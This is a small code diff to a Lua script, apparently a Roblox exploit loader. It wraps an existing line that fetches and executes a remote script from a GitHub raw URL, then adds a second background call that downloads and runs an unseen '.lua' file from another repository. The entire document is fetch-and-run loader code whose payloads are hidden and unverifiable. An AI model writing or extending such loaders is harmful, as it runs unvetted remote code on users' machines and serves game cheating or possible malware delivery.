@@ -1,1 +1,7 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowMods-Dev/ScriptRepo/refs/heads/main/upd-script"))()
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShadowMods-Dev/ScriptRepo/refs/heads/main/upd-script"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/UNC-scripter/auto-code-/refs/heads/main/.lua"))()
+end)
